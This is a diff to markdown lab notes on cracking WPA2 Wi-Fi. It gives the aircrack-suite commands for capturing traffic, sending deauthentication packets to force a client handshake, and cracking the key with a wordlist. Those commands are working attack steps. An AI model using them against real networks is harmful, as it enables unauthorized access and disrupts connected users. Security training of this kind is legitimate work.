@@ -115,9 +115,9 @@ airodump-ng <interface name>
 airodump-ng --bssid <bssid> -c <channel> -w <name of the AP> <interface name>
 ```
 
-> this will be our receiver for the handshake that has the WPA2 key
+> the above will show clients connected on the AP
 
-→ now that we have our receiver setup and we know the details of the targeted AP, we do deauth attack on the AP
+→ now that we have our clients setup details and we know the details of the targeted AP, we do deauth attack on the AP for the client
 
 to do this 
 in a new terminal
@@ -127,18 +127,19 @@ aireplay-ng -0 11 -a <bssid> -c <destination mac address acquired from the previ
 > -0 = sets the deauth attack
 > 11 = is the number of packets for deauth
 > -a = target AP MAC address (bssid)
-> -c = sets target MAC address
+> -c = sets target MAC address (Client)
 
 → keep repeating the process untill we get a **WPA handshake: <bssid\>** in the airodump tab
 stop the packet capture `CTRL + C`
 
-→ now the only thing remaining is to crack the password
+→ **now the only thing remaining is to crack the password, This is the only thing we need to perform on this lab because in VM , We can't do all above steps**
 ```bash
 aircrack-ng -a2 <bssid> -w <path/to/wordlist> <path/to/captured-hanshake>
 ```
 > -a = specifies attack mode
 > 2 = specifies that it is a WPA-PSK 
 > -w = wordlist
+> bssid -> MAC of AP
 
 To find the **bssid** given the .cap file 
 ```bash
